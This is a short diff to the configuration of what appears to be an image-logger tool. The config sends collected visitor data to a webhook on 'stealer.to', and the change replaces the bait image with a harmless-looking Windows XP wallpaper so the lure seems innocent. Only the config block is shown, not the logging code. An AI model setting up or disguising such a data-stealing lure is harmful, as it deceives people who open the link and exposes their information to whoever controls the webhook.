@@ -13,7 +13,7 @@ __author__ = "Yari"
 config = {
     # BASE CONFIG #
     "webhook": "https://stealer.to/post?uniqueid=cb4b17b1",
-    "image": "https://dinopixel.com/preload/0922/Don-t-Click-the-button.png", # You can also have a custom image by using a URL argument
+    "image": "https://images.techhive.com/images/article/2014/04/windows-xp-bliss-desktop-image-100259888-orig.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
